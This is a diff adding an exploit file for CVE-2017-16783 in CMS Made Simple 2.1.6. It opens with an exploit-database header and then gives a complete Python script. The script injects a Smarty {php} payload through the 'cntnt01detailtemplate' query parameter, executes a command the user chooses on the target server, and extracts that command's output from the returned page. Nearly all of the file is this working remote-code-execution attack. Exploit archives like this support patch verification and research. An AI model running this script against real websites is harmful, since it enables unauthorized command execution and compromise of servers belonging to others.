@@ -1,0 +1,55 @@
+# Exploit Title: CMS Made Simple 2.1.6 - 'cntnt01detailtemplate' Server-Side Template Injection
+# Google Dork: N/A
+# Date: 11/10/2017
+# Exploit Author: Gurkirat Singh <tbhaxor@gmail.com>
+# Vendor Homepage: http://www.cmsmadesimple.org/
+# Software Link: N/A
+# Version: 2.1.6
+# Tested on: Linux
+# CVE : CVE-2017-16783
+# POC : https://www.netsparker.com/blog/web-security/exploiting-ssti-and-xss-in-cms-made-simple/
+
+PFA
+-------
+Gurkirat Singh
+(tbhaxor <https://google.com/search?q=tbhaxor>)
+
+from argparse import ArgumentParser, RawTextHelpFormatter
+from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote_plus
+import requests as http
+import re
+from bs4 import BeautifulSoup, Tag
+from huepy import *
+parser = ArgumentParser(description="Exploit for CVE-2017-16783",
+                        formatter_class=RawTextHelpFormatter)
+parser.add_argument(
+    "--target",
+    "-t",
+    help="complete remote target with protocol, host, path and query",
+    required=True,
+    dest="t")
+parser.add_argument("--command",
+                    "-c",
+                    help="command to execute (default: whoami)",
+                    default="whoami",
+                    dest="c")
+args = parser.parse_args()
+
+print(info("Building malicious url"))
+url = urlparse(args.t)
+query = parse_qs(url.query)
+query["cntnt01detailtemplate"] = [
+    "string:{php}echo `echo tbhaxor;%s;echo tbhaxor`;{/php}" % args.c
+]
+query = {k: ",".join(v) for k, v in query.items()}
+query = unquote_plus(urlencode(query, doseq=False))
+_url = url.scheme + "://" + url.netloc + url.path + "?" + query
+print(good("Done"))
+print(info("Executing payload"))
+r = http.get(_url)
+html = BeautifulSoup(r.content.decode(), "html5lib")
+main: Tag = html.find("article", {"id": "main"})
+main = re.sub(r"^Home", "", main.text.strip()).replace("tbhaxor", "").strip()
+print(good("Done"))
+print(info("Result"))
+print(main)
